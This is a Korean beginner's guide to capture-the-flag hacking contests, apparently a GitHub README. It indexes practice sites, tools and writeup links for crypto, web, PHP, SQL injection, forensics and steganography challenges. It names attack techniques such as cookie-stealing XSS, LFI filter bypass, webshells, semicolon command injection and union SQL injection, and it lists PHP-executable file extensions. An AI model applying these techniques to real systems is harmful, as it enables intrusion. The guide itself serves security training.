# CTF starter Hidiot

### 1) 소개
**CTF(Capture the Flag)** 는 간단히 말해서 **해킹 대회**

### 2) wargame
wargame은 자신의 페이스로 진행할 수 있는 환경입니다.      

- 국내
    - [드림핵](https://dreamhack.io/) - 정말 좋아요 🔥🔥🔥
    - [[DigitalForensic]  with  CTF](http://ctf-d.com/) - 포렌식 문제 위주
    - [H4CKING GAME](https://h4ckingga.me/)
    - [SuNiNaTaS](http://suninatas.com/)
    - [xcz.kr](http://xcz.kr/START/index.php)
    - [webhacking.kr](https://webhacking.kr/) - 많이 어려움

- 해외
    - [picoCTF](https://picoctf.org/)
    - [ctflearn](https://ctflearn.com/)
    - [TryHackMe](https://tryhackme.com/)
    - [HACT THE BOX](https://www.hackthebox.com/)
    - [cryptopals](https://cryptopals.com/) - 크립토
    - [traboda](https://app.traboda.com/challenges)
    - [ringzer0ctf](https://ringzer0ctf.com/)

- 일본
    - [CpawCTF](https://ctf.cpaw.site/)
    - [ksnctf](https://ksnctf.sweetduet.info/)

### 3) 대회
매주 대회가 개최되며 일정은 [CTF TIME](https://ctftime.org/)에서 확인할 수 있습니다.

대회 난이도가 높으면 성취감을 얻기 힘들기 때문에 낮은 레이팅 부터 시작하거나 워게임 부터 진행합니다.

![cover](./images/ctftime.png)

### 4) writeup
문제를 어떻게 풀었는 기술하는 작업
, 예시: [0xL4ugh-CTF-writeup](https://velog.io/@skyepodium/0xL4ugh-CTF-writeup)

ctf time의 경우 대회 종료 후 [write up](https://ctftime.org/event/1660/tasks/)과 같이 유저들이 올리기도 하고

구글링, 유튜브 등등 으로 검색가능합니다.

### 5) 지난 대회
대부분의 대회 종료 후 서버를 닫고, 문제를 공개하지 않습니다. 일부 대회의 경우 문제와 함께 답을 공개합니다.

- [squareCTF](https://squarectf.com/)   
    square는 미국의 모바일 결제 기업입니다. 매년 CTF 대회를 개최하고, docker로 문제를 제공합니다. 정답도 포함되어 있습니다.

# 1. crypto
### 1) [Cyber chef](https://gchq.github.io/CyberChef/) 🔥🔥🔥
다양한 암호 알고리즘의 디코딩, 인코딩을 온라인으로 지원합니다.

사용법이 간편하고, 문자열 입력값에 따라 가장 유사한 디코딩 알고리즘도 추천해줍니다.
(참고로, 영국 정부통신본부에서 만들었습니다.)

### 2) [암호 알고리즘 판별](https://www.dcode.fr/cipher-identifier) 
어떤 알고리즘인지 감이 안잡히는 경우 대략적으로 파악할 수 있습니다.   
- [[EZCTF] No kidding](https://skyepodium.tistory.com/entry/EZCTF-No-kidding)

- [[TFC CTF 2022] BASIC](https://skyepodium.tistory.com/entry/TFC-CTF-2022-BASIC)

### 3) Base64 🔥🔥🔥
기본중의 기본으로 정말 여러가지로 응용해서 나옵니다.
- [base64 repair](https://base64.guru/tools/repair)
- [[ctflearn] Base 2 2 the 6](https://skyepodium.tistory.com/entry/ctflearn-Base-2-2-the-6?category=1029036)
- [[pico CTF] login](https://skyepodium.tistory.com/entry/pico-CTF-login)
- [파이썬 구현](https://velog.io/@skyepodium/base64-%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EA%B5%AC%ED%98%84)

### 4) [ROT13 - caesar cypher](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13))
쉬운 문제로 종종 출제되거나 다른 문제에 응용됩니다.
- [[pico CTF] caesar](https://skyepodium.tistory.com/entry/pico-CTF-caesar)

### 5) [비즈네르 암호(vigenere cypher)](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('blorpy')&input=Z3dveHtSZ3Fzc2loWXNwT250cXB4c30)
문자열과 key를 기반으로 암복호화하는 알고리즘 입니다.     

- [[ctflearn] Vigenere Cipher](https://skyepodium.tistory.com/entry/ctflearn-Vigenere-Cipher?category=1029036)
- [[Vigenere Cipher] 비즈네르 암호 구현](https://velog.io/@skyepodium/Vigenere-Cipher-%EB%B9%84%EC%A6%88%EB%84%A4%EB%A5%B4-%EC%95%94%ED%98%B8-%EA%B5%AC%ED%98%84)

### 6) 진법과 아스키
정말 다양한 방법들이 있습니다, cyber chef를 적극 이용합니다.

- [[ctflearn] Character Encoding](https://skyepodium.tistory.com/entry/ctflearn-Character-Encoding?category=1029036)     
- [[ctflearn] Reverse Polarity](https://skyepodium.tistory.com/entry/ctflearn-Reverse-Polarity?category=1029036)
- [[EZCTF] Qweauty and the Beast](https://skyepodium.tistory.com/entry/EZCTF-Qweauty-and-the-Beast) - 8진법 + 키보드
- [[SuNiNaTaS] challenge 18](https://skyepodium.tistory.com/entry/SuNiNaTaS-challenge-18)

- [0xL4ugh CTF Me & You!](https://velog.io/@skyepodium/0xL4ugh-CTF-writeup#5-me--you) - 8진법

- white space      
    난해한 언어 문제 아님, 공백인데 아스키코드가 달라서, 2진수로 복호화하는 문제
    - [[ctflearn] Blank Page](https://skyepodium.tistory.com/entry/ctflearn-Blank-Page) - 공백으로 이루어진 파일

    - [[pico CTF] WhitePages](https://skyepodium.tistory.com/entry/pico-CTF-WhitePages)

### 7) [모스부호](https://onlineasciitools.com/convert-morse-to-ascii)
- [[EZCTF] More sense](https://skyepodium.tistory.com/entry/EZCTF-More-sense)
- [[cflearn] Morse Code](https://skyepodium.tistory.com/entry/cflearn-Morse-Code?category=1029036)

### 7) [키보드 레이아웃](https://awsm-tools.com/text/keyboard-layout)
키보드 배열 다르게 해서 암호 문제로 제출됩니다.    
- [[BCACTF 3.0] New Keyboard](https://skyepodium.tistory.com/entry/BCACTF-30-New-Keyboard?category=1028047)

### 8) 특이한 알고리즘
쉬운대회에서는 **crypto** 영역에 정말 특이한 알고리즘을 가져옵니다.

사실 이런 문제들은 점수는 낮은데 시간은 많이 소모되어서 나중에 하는것이 좋습니다.

- [Multi-tap Phone](https://en.wikipedia.org/wiki/Multi-tap)  
구형 휴대폰 숫자 패드 기반의 암호문을 의미합니다.
    - [[EZCTF] No kidding](https://skyepodium.tistory.com/entry/EZCTF-No-kidding)

    - [[shell ctf 2022] Tring Tring....](https://skyepodium.tistory.com/entry/shell-ctf-2022-Tring-Tring)

- [줌 아웃](https://skyepodium.tistory.com/entry/EZCTF-OMG)

- [hexahue](https://skyepodium.tistory.com/entry/EZCTF-Too-Many-Colors)

![cover](./images/hexahue.jpeg)
- [postal code]
    - [[Patriot CTF] No Postcode Envy](https://skyepodium.tistory.com/entry/Patriot-CTF-No-Postcode-Envy)
    - [[H4CKING GAME] - Hello,Postman](https://skyepodium.tistory.com/entry/H4CKING-GAME-HelloPostman)

![cover](./images/postal.png)
- spam mimic
    스팸처럼 보이기 만든 암호문입니다.
    - [[DigitalForensic] with CTF - 원래 의미가 없는 것들도…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%9B%90%EB%9E%98-%EC%9D%98%EB%AF%B8%EA%B0%80-%EC%97%86%EB%8A%94-%EA%B2%83%EB%93%A4%EB%8F%84%E2%80%A6)

- birds on wire cipher
전깃줄 위의 새의 모습으로 암호문을 만드는 알고리즘 입니다.
![cover](./images/birdsonwire.jpeg)
    - [[shell ctf 2022] Tweeeet](https://skyepodium.tistory.com/entry/shell-ctf-2022-Tweeeet)
 
- play fair cipher     
![cover](./images/playfair.png)
    - [[ctflearn] Suspecious message](https://skyepodium.tistory.com/entry/ctflearn-Suspecious-message)

- wakanda cipher    
![cover](./images/wakanda.png)
    - [[shell ctf 2022] World's Greatest Detective](https://skyepodium.tistory.com/entry/shell-ctf-2022-Worlds-Greatest-Detective)

- Braille cipher    
![cover](./images/braille.png)       
    - [0xL4ugh-CTF - Cylops](https://velog.io/@skyepodium/0xL4ugh-CTF-writeup#4-cylops)
    - [[shell ctf 2022] Feel me](https://skyepodium.tistory.com/entry/shell-ctf-2022-Feel-me)

### 10) 난해한 프로그래밍 언어 - Esolang
crypto 문제에 난해한 프로그래밍 언어로 작성된 코드가 주어지기도 합니다.
- Malbolge     
이 분야의 정점, 최고 그 무엇도 이길 수 없음 레알 개극혐
    - [[shell ctf 2022] MALBORNE](https://skyepodium.tistory.com/entry/shell-ctf-2022-MALBORNE)

### 11) 난해한 프로그래밍 스타일 - esoteric programming style
난해한 프로그래밍 언어가 아니고, 난해한 스타일
- JSFuck
     - JSFuck은 `[ ] ( ) ! +` 6개의 문자로만 사용하는 JS 코딩 스타일입니다.
     - [[GREP CTF] esoF*ck](https://skyepodium.tistory.com/entry/GREP-CTF-esoFck)

- [[Root Me] Native code](https://skyepodium.tistory.com/entry/Root-Me-Native-code)

### 12) SHA 256
해싱 알고리즘으로 복호화는 불가능합니다. 레인보우 테이블에서 검색해야합니다.
- [[TFC CTF 2022] ARE YOU THE ADMIN?](https://skyepodium.tistory.com/entry/TFC-CTF-2022-ARE-YOU-THE-ADMIN-1)

### 13) ROT13
카이사르 암호
- [[SuNiNaTaS] challenge 19](https://skyepodium.tistory.com/entry/SuNiNaTaS-challenge-19)

### 14) XOR
XOR은 다음과 같은 특징을 가지기 때문에 대칭 암호화 기법에 사용됩니다.
```
a ^ b == c
c ^ a == b
c ^ b == a
```

- [[DigitalForensic] with CTF - ROX](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-ROX)

- [[shell ctf 2022] Secret Document](https://skyepodium.tistory.com/entry/shell-ctf-2022-Secret-Document) - XOR로 PNG 파일 만드는 문제

- [[shell ctf 2022] OX9OR2](https://skyepodium.tistory.com/entry/shell-ctf-2022-OX9OR2) - XOR 유추 문제


# 2. web
### 1) [Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg) 🔥🔥🔥
웹이 어떤 프레임워크로 구성되어있는지 확인해주는 크롬 확장 프로그램, 개인적으로 정말 잘쓰고 있어서 추천!!!   

![cover](./images/wappalyzer.png)


### 2) [크로스 사이트 스크립팅 - xss](https://github.com/skyepodium/ctf-starter-hidiot/blob/main/web/xss.md)
- store XSS
    - [BYU CTF 2022 - Social Media](https://skyepodium.tistory.com/entry/BYU-CTF-2022-Social-Media-%ED%81%AC%EB%A1%9C%EC%8A%A4%EC%82%AC%EC%9D%B4%ED%8A%B8-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85?category=1028047) - 정석적인 쿠키 탈취 문제

    - [[BSidesSF CTF] web-tutorial-1](https://skyepodium.tistory.com/entry/BSidesSF-CTF-web-tutorial-1?category=1028047) - 응용 문제

- reflection XSS
    - [[shell ctf 2022] Choosy](https://skyepodium.tistory.com/entry/shell-ctf-2022-Choosy)

### 3) Header
- [[pico CTF] Who are you?](https://skyepodium.tistory.com/entry/pico-CTF-Who-are-you)

### 4) file traversal
웹 디렉토리 찾는 문제, 자주 출제됩니다.

[Forbidden Paths](https://skyepodium.tistory.com/entry/pico-CTF-Forbidden-Paths)

### 5) 웹쉘
네트워크로 받은 파라미터를 통해 시스템 콜을 사용하는 취약점입니다.
- [UMassCTF 2021 - Hermit - Part 1](https://velog.io/@skyepodium/UMassCTF-2021-writeup)
- [[Square CTF 2017] Password checker](https://skyepodium.tistory.com/entry/Square-CTF-2017-Password-checker)

### 6) 자바스크립트 재정의
클라이언트 사이드에서 자바스크립트로 필터링 하고 있다면, 다음 문제처럼 그냥 재정의 해버립시다.
- [[SECCON Beginners CTF 2022] Util](https://skyepodium.tistory.com/entry/SECCON-Beginners-CTF-2022-Util)

### 7) command injection
`';'` 세미콜론으로 커맨드 구분해서 나오는 경우가 있습니다.
- [[SECCON Beginners CTF 2022] Util](https://skyepodium.tistory.com/entry/SECCON-Beginners-CTF-2022-Util)

- [[corCTF 2022] msfrog-generator](https://skyepodium.tistory.com/entry/corCTF-2022-msfrog-generator)

### 8) [자바스크립트 난독화 예쁘게](https://beautifier.io/)
난독화 된것을 원래대로는 못돌리고, 예쁘게 포맷팅해서 분석해야합니다.

[[pico CTF] Client-side-again](https://skyepodium.tistory.com/entry/pico-CTF-Client-side-again)

### 9) 크롬 브라우저 **Search in all files**
웹앱의 모든 리소스에서 문자열을 검색할 때 유용합니다.
- [[pico CTF] Search source](https://skyepodium.tistory.com/entry/pico-CTF-Search-source)
- [[GreyCTF] flappy-js](https://skyepodium.tistory.com/entry/GreyCTF-flappy-js)
### 10) xml
- [[NahamCon_CTF_2022] extravagant](https://skyepodium.tistory.com/entry/NahamConCTF2022-extravagant) - XML external entity attack(xml 외부 엔티티 공격) 문제

### 11) __builtins__
- [[EZCTF] Save peach](https://skyepodium.tistory.com/entry/EZCTF-Save-peach) - 파이썬 시스템 콜

### 11) 특이한 문제
- [PDF - latex](https://skyepodium.tistory.com/entry/SECCON-Beginners-CTF-2022-textex)

### 12) regex-injection
- [[NahamCon_CTF_2022] personnel](https://skyepodium.tistory.com/entry/NahamConCTF2022-personnel)

### 13) 웹 사이트 스캔
숨겨진 페이지를 찾는 문제
- [[Grey Cat The Flag 2022] Too Fast](https://skyepodium.tistory.com/entry/Grey-Cat-The-Flag-2022-Too-Fast)

### 14) burp suite 🔥🔥🔥
브라우저와 서버 요청 사이에 프록시 서버를 두어서, 요청 및 응답을 변형시키는데 사용합니다.
- [[TFC CTF 2022] ARE YOU THE ADMIN?](https://skyepodium.tistory.com/entry/TFC-CTF-2022-ARE-YOU-THE-ADMIN)

### 15) 페이로드 조작
서버에 조작된 값을 보냅니다.
- [[corCTF 2022] jsonquiz](https://skyepodium.tistory.com/entry/corCTF-2022-jsonquiz)


### 16) 노가다 문제
개인적으로 제일 극혐하는 문제 종류중 하나입니다.

딱히 목적도, 의미도 없고, 출제자의 의도를 추리해야합니다.

- [[shell ctf 2022] Colour Cookie](https://skyepodium.tistory.com/entry/shell-ctf-2022-Colour-Cookie)

### 17) LFI 🔥 
LFI란 서버 local에 있는 파일로 공격을 수행하는 기법입니다.
- PHP    
    - [[H4CKING GAME] - PHP LFI](https://skyepodium.tistory.com/entry/H4CKING-GAME-PHP-LFI) - base64인코딩으로 파라미터 필터 우회

    - [[webhacking.kr] challenge 25](https://skyepodium.tistory.com/entry/webhackingkr-challenge-25) - base64 인코딩으로 파일 내용 필터 우회

- 그외
    - [[nullcon Goa HackIM CTF 2022] - i love browsers](https://skyepodium.tistory.com/entry/nullcon-Goa-HackIM-CTF-2022-i-love-browsers) - User-Agent기반 LFI 문제, LFI라고 예상하기 어려움

# 3. php
php는 웹에 분류되지만, 자주 출제됩니다.

### 1) php파일로 인식될 수 있는 확장자
```
php
php3
php4
php5
php7
pht
phtml
phar
```
### 2) [php pregreplace](https://skyepodium.tistory.com/entry/php-pregreplace)
문자열 필터링
### 3) php filter bypass
특정 문자열 필터를 바이 패싱 하는 문제
- [[EZCTF] I made a blog!](https://skyepodium.tistory.com/entry/EZCTF-I-made-a-blog) - base64 사용

### 4) 시스템 콜
- [shell_exec](https://skyepodium.tistory.com/entry/Patriot-CTF-Spongebob)

# 4. SQL Injection
### 1) [cheet sheet](https://github.com/skyepodium/ctf-starter-hidiot/blob/main/sqli/sheet.md)

### 2) 주석 처리
sql 에서 주석 처리는 DB 마다 다르지만 MySql에서는 '--' 으로 할 수 있습니다.

다만, 이는 where 절에서 가능하며
INSERT 구문의 value에서는 불가능합니다.

### 3) 기초
- [[ctflearn] Basic Injection](https://skyepodium.tistory.com/entry/ctflearn-Basic-Injection?category=1029036)
- [[EZCTF] Super Secure](https://skyepodium.tistory.com/entry/EZCTF-Super-Secure)

### 4) blind sql injection 🔥 
브루트 포스와 함께 사용하며, 내가 생각하는 데이터가 맞는지 맞추면서 진행됩니다.
- [SquareCTF 2020 - Deep Web Blog](https://velog.io/@skyepodium/SquareCTF-Writeup)

### 5) union sql injection 🔥
union을 사용하는 방법으로 유용합니다. DB에 따라 필요한 정보가 조금 다릅니다.

- mysql
    - [[BSidesSF CTF] Sequels: A New Bug](https://skyepodium.tistory.com/entry/BSidesSF-CTF-Sequels-A-New-Bug)

- sqlite
    - [[Square CTF 2017] little-doggy-tables](https://skyepodium.tistory.com/entry/Square-CTF-2017-little-doggy-tables)
    - [[shell ctf 2022] Extractor](https://skyepodium.tistory.com/entry/shell-ctf-2022-Extractor)



# 5. forensics
### 1) Hex editor 🔥🔥🔥
헥스 에디터는 필수품으로 정말 많은 분야에서 사용됩니다.
- windows - https://mh-nexus.de/en/hxd/
- mac - ihex

- [[pico CTF] information](https://skyepodium.tistory.com/entry/pico-CTF-information)

### 2) [Wireshark](https://www.wireshark.org/) 🔥🔥🔥
와이어 샤크 - 패킷 덤프를 분석하는 프로그램

- [[pico CTF] shark on wire 1](https://skyepodium.tistory.com/entry/pico-CTF-shark-on-wire-1)      

- [[n00bzCTF] tcpdump](https://skyepodium.tistory.com/entry/n00bzCTF-tcpdump) - hex 손실없이 export 하는 방법

- [[DigitalForensic] with CTF - splitted](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-splited) - 와이어샤크에서 주고받은 object 모두 export 하는 방법

- [[Cpaw ctf] Q16.[Network+Forensic]HTTP Traffic](https://skyepodium.tistory.com/entry/Cpaw-ctf-Q16NetworkForensicHTTP-Traffic) - 오브젝트 추출 문제

필터링 예시
```
frame contains login

http2.header.name=="flag"

frame contains image

frame contains anticheat
```

### 3) fcrack
zip 파일을 여는 프로그램
- [CyberYoddha CTF - Crack the Zip!](https://velog.io/@skyepodium/CyberYoddha-CTF-Writeup#2-crack-the-zip)

### 4) jar
jar 명령어를 통해 손상된 zip 파일을 열 수 있습니다.
```
jar xvf a.zip
```

# 6. stegnography
[스테가노그라피 툴킷 모음](https://github.com/DominicBreuker/stego-toolkit/blob/master/README.md#tools)

### 1) [foremost](http://foremost.sourceforge.net/) 🔥
포렌식용 툴인데, 파일 카빙할 때 사용 가능합니다. 개인적으로 제일 좋아합니다.

윈도우에서는 [WSL(Windows Subsystem for Linux)](https://docs.microsoft.com/ko-kr/windows/wsl/install) 에 설치합니다.

```
foremost -t all a.png
```

- [[ctflearn] Binwalk](https://skyepodium.tistory.com/entry/ctflearn-Binwalk?category=1029036)

- [[ctflearn] Tux!](https://skyepodium.tistory.com/entry/ctflearn-Tux) - exiftool, foremost 모두 사용

### 2) [binwalk](https://github.com/ReFirmLabs/binwalk)
이미지에 숨겨진 파일을 추출합니다.   
```
binwalk --extract --dd=".*" a.png
```
- [[pico CTF] Matryoshka doll](https://skyepodium.tistory.com/entry/pico-CTF-Matryoshka-doll)
- [[pico CTF] MacroHard WeakEdge](https://skyepodium.tistory.com/entry/pico-CTF-MacroHard-WeakEdge)
- [[DigitalForensic] with CTF - 호레이쇼가 플래그를 보며…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%ED%98%B8%EB%A0%88%EC%9D%B4%EC%87%BC%EA%B0%80-%ED%94%8C%EB%9E%98%EA%B7%B8%EB%A5%BC-%EB%B3%B4%EB%A9%B0%E2%80%A6)
- [[DigitalForensic] with CTF - DOS 모드에서는…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-DOS-%EB%AA%A8%EB%93%9C%EC%97%90%EC%84%9C%EB%8A%94%E2%80%A6)

### 3) [zsteg](https://github.com/zed-0xff/zsteg)
이미지에 숨겨진 문자열을 찾아냅니다.

- [[BCACTF 3.0] My New Friend](https://skyepodium.tistory.com/entry/BCACTF-30-My-New-Friend)
- [[Square CTF 2017] Stegasaurus - Treasure hunt](https://skyepodium.tistory.com/entry/Square-CTF-2017-Stegasaurus-Treasure-hunt) - 파이썬 코드
- [[ctflearn] St3g0](https://skyepodium.tistory.com/entry/ctflearn-St3g0)

### 4) stegsolve
색, 명암을 변경하여 숨겨진 문자열을 찾습니다.
- [[EZCTF] Neo](https://skyepodium.tistory.com/entry/EZCTF-Neo)
- [CyberYoddha CTF - Steg 2](https://velog.io/@skyepodium/CyberYoddha-CTF-Writeup#4-steg-2)
- [syskronCTF - 5. Wednesday](https://velog.io/@skyepodium/syskronCTF-Writeup#5-wednesday)
- [[H4CKING GAME] - Paint](https://skyepodium.tistory.com/entry/H4CKING-GAME-Paint)
- [[DigitalForensic] with CTF - 플래그를 얻어라!](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%ED%94%8C%EB%9E%98%EA%B7%B8%EB%A5%BC-%EC%96%BB%EC%96%B4%EB%9D%BC)
- [[DigitalForensic] with CTF - Find Key(moon)](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Find-Keymoon)

### 5) exiftool
파일속에 숨겨진 정보를 찾습니다.
- [[ctflearn] WOW…. So Meta](https://skyepodium.tistory.com/entry/ctflearn-WOW%E2%80%A6-So-Meta?category=1029036)
- [[ctflearn] Snowboard](https://skyepodium.tistory.com/entry/ctflearn-Snowboard)
- [[DigitalForensic] with CTF - Wota](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Wota) 🔥
- [[DigitalForensic] with CTF - 내 친구는 이것이 특별한...](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EB%82%B4-%EC%B9%9C%EA%B5%AC%EB%8A%94-%EC%9D%B4%EA%B2%83%EC%9D%B4-%ED%8A%B9%EB%B3%84%ED%95%9C)
- [[SuNiNaTaS] challenge 15](https://skyepodium.tistory.com/entry/SuNiNaTaS-challenge-15)

### 6) [스테가노그라피 온라인](https://stylesuxx.github.io/steganography/)
숨겨진 문자열을 찾습니다.

- [[EZCTF] Nobody's perfect](https://skyepodium.tistory.com/entry/EZCTF-Nobodys-perfect)

### 7) [steghide 스테그하이드](https://futureboy.us/stegano/decinput.html) 🔥
비빌먼호 넣고 메시지를 숨기는 경우가 있습니다.

- [[EZCTF] Bernie](https://skyepodium.tistory.com/entry/EZCTF-Bernie)
- [[shell ctf] Hidden File](https://skyepodium.tistory.com/entry/shell-ctf-Hidden-File)
- [[DigitalForensic] with CTF - 답을 찾고 제출해라!](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EB%8B%B5%EC%9D%84-%EC%B0%BE%EA%B3%A0-%EC%A0%9C%EC%B6%9C%ED%95%B4%EB%9D%BC)
### 8) strings
바이너리 파일에서 문자열을 추출하는 함수
- [[ctflearn] Forensics 101](https://skyepodium.tistory.com/entry/ctflearn-Forensics-101?category=1029036)

- [[pico CTF] strings it](https://skyepodium.tistory.com/entry/pico-CTF-strings-it)

- [[GreyCTF] Image Upload](https://skyepodium.tistory.com/entry/GreyCTF-Image-Upload)

- [[DigitalForensic] with CTF - Graphics Interchange Format](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Graphics-Interchange-Format)

- [[DigitalForensic] with CTF - 저는 플래그를 이 파일에..](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%A0%80%EB%8A%94-%ED%94%8C%EB%9E%98%EA%B7%B8%EB%A5%BC-%EC%9D%B4-%ED%8C%8C%EC%9D%BC%EC%97%90)


### 9) Image Steganography
https://incoherency.co.uk/image-steganography/#unhide

### 10) [find/replace](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':''%7D,'',true,false,true,false))
이미지 파일에 필요없는 문자열이 들어간 경우 cyberchef의 find/replace 기능을 사용할 수 있습니다.
- [[TFC CTF 2022] BBBBBBBBBB](https://skyepodium.tistory.com/entry/TFC-CTF-2022-BBBBBBBBBB)

### 11) [audacity](https://www.audacityteam.org/) 🔥🔥🔥
음향 프로그램, 스펙트로그램 이외에도, 음악 뒤집기, 속도 조절등을 수행합니다.
- [[DigitalForensic] with CTF - Three Thieves Threw Trumpets Through Trees](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Three-Thieves-Threw-Trumpets-Through-Trees) - 뒤집기, 속도 느리게 하기 🔥

- [[EZCTF] Wavie Wave](https://skyepodium.tistory.com/entry/EZCTF-Wavie-Wave) - 스펙트로 그램

- [[DigitalForensic] with CTF - Listen carefully!!](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Listen-carefully) - 스펙트로 그램, 속도 느리게 하기

- [[shell ctf 2022] Alien Communication](https://skyepodium.tistory.com/entry/shell-ctf-2022-Alien-Communication)

### 12) 파일 시그니처
png, jpeg 파일 마다 고유한 시그니처를 가지고 있습니다.

보통 파일을 복구하는 문제가 나옵니다.    
[*참고 - 파일 시그니처 목록](http://forensic-proof.com/archives/300)

- jpg
    - [[DigitalForensic] with CTF - 거래 조건 알고 있잖아요?](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EA%B1%B0%EB%9E%98-%EC%A1%B0%EA%B1%B4-%EC%95%8C%EA%B3%A0-%EC%9E%88%EC%9E%96%EC%95%84%EC%9A%94)

    - [[H4CKING GAME] - cat](https://skyepodium.tistory.com/entry/H4CKING-GAME-cat)

- gz
    - [[DigitalForensic] with CTF - 우리는 이 파일에 플래그를...](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%9A%B0%EB%A6%AC%EB%8A%94-%EC%9D%B4-%ED%8C%8C%EC%9D%BC%EC%97%90-%ED%94%8C%EB%9E%98%EA%B7%B8%EB%A5%BC) 


- rar
    - [[ctflearn] Minions](https://skyepodium.tistory.com/entry/ctflearn-Minions) - foremost, binwalk 모두 안되면, hex에디터열고 직접 파일 카빙 합니다.

### 13) QR 코드
QR 코드 복원 문제가 종종 나옵니다.
- [[DigitalForensic] with CTF - QR코드를 발견했지만…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-QR%EC%BD%94%EB%93%9C%EB%A5%BC-%EB%B0%9C%EA%B2%AC%ED%96%88%EC%A7%80%EB%A7%8C%E2%80%A6)

### 14) [aperisolve](https://www.aperisolve.com/) 🔥
이미지 분석에 사용하며, 아래의 것들을 한번에 분석합니다.
- stegsolve
- zsetg
- steghide
- outguess
- exiftool
- binwalk
- foremost
- strings
- PngCheck

### 15 [StegOnline](https://stegonline.georgeom.net/upload)
작아서 잘 안보이는 경우에 사용합니다.
- [[DigitalForensic] with CTF - 제 친구의 개가 바다에서…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%A0%9C-%EC%B9%9C%EA%B5%AC%EC%9D%98-%EA%B0%9C%EA%B0%80-%EB%B0%94%EB%8B%A4%EC%97%90%EC%84%9C%E2%80%A6)


### 16. pillow 🔥🔥🔥
pillow는 파이선 기반 이미지 처리 도구입니다.
사진에 어떤 메시지를 심는 경우 뽑아낼 수 있습니다.

이미지 처리 도구 사용할 수 있어야 조금 어려운 문제 다룰 수 있습니다.

- 이진수 
    - [[DigitalForensic] with CTF - 브리타니아의 원더랜드…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EB%B8%8C%EB%A6%AC%ED%83%80%EB%8B%88%EC%95%84%EC%9D%98-%EC%9B%90%EB%8D%94%EB%9E%9C%EB%93%9C%E2%80%A6) - pillow, 2진법 정석 문제

    - [[DigitalForensic] with CTF - Emma Watson](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-Emma-Watson) - stegsolve + pillow

    - [[DigitalForensic] with CTF - flagception](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-flagception) - stegsolve + pillow

    - [[H4CKING GAME] - CODE](https://skyepodium.tistory.com/entry/H4CKING-GAME-CODE)

    - [[DigitalForensic] with CTF - Find Key(Image)]([DigitalForensic] with CTF - Find Key(Image))

- RGB
    - [[DigitalForensic] with CTF - 와우! 저는 이 이미지에…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%99%80%EC%9A%B0-%EC%A0%80%EB%8A%94-%EC%9D%B4-%EC%9D%B4%EB%AF%B8%EC%A7%80%EC%97%90%E2%80%A6) - rgb값을 아스키코드로 변환

    - [[DigitalForensic] with CTF - google](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-google) - RGBA 문제

    - [[DigitalForensic] with CTF - mystery1 - mystery2](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-mystery1-mystery2) - 2개의 png 파일 비교

    - [[ctflearn] Image Magic](https://skyepodium.tistory.com/entry/ctflearn-Image-Magic)

    - [[shell ctf 2022] Heaven](https://skyepodium.tistory.com/entry/shell-ctf-2022-Heaven) - stegsolve 사용

- 메시지를 그림으로 그리기
    - [[corCTF 2022] whack-a-frog](https://skyepodium.tistory.com/entry/corCTF-2022-whack-a-frog) - 좌표값을 그림으로 그리기

### 17. image combiner 🔥🔥🔥🔥🔥
2개의 이미지의 RGB값을 XOR, SUB등 하는 경우가 속합니다.
- XOR 연산
    - [[ctflearn] Exclusive Santa](https://skyepodium.tistory.com/entry/ctflearn-Exclusive-Santa) - 정석문제

- subtraciton 연산    
음수가 되면 255를 더해줍니다.
    - [[TFC CTF 2022] cat](https://skyepodium.tistory.com/entry/TFC-CTF-2022-cat) - 비슷한 이미지를 구글링해서 찾고, 2개의 이미지를 연산하는 문제

### 18. gif
gif 분해 문제
- [[DigitalForensic] with CTF - 저는 이미지에서 어떤 것을…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%A0%80%EB%8A%94-%EC%9D%B4%EB%AF%B8%EC%A7%80%EC%97%90%EC%84%9C-%EC%96%B4%EB%96%A4-%EA%B2%83%EC%9D%84%E2%80%A6)

### 19. git
깃 커밋 이력을 통해 flag를 확인하는 문제입니다.
- [[ctflearn] Git Is Good](https://skyepodium.tistory.com/entry/ctflearn-Git-Is-Good)

### 20. zip
여러번 압축한 파일을 다룹니다.
- [[ctflearn] like1000](https://skyepodium.tistory.com/entry/ctflearn-like1000)

### 21. png 복구 🔥🔥🔥
png는 파일 시그니처가 명확하고, 다양하기 때문에 복구하는 문제가 자주 나옵니다.
- [[DigitalForensic] with CTF - 저는 이 파일이 내 친구와…](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-%EC%A0%80%EB%8A%94-%EC%9D%B4-%ED%8C%8C%EC%9D%BC%EC%9D%B4-%EB%82%B4-%EC%B9%9C%EA%B5%AC%EC%99%80%E2%80%A6)

# 7 . reversing
### 1) [기드라](https://ghidra-sre.org/) 🔥🔥🔥
NSA에서만든 C언어 디컴파일러, 영화에 나오는 그 곳 맞습니다.
